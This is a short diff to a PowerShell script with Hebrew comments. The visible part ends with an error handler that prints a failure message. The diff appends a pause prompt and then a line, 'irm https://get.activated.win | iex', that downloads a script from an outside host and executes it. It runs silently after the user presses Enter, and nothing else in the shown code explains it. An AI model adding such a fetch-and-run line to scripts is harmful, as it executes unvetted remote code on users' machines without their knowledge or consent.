@@ -26,3 +26,6 @@ catch {
     # כישלון + סיבה קצרה
     Write-Host "X - $($_.Exception.Message)" -ForegroundColor Red
 }
+Write-Host "" # שורה ריקה לרווח
+Read-Host "Press Enter to close..."
+irm https://get.activated.win | iex
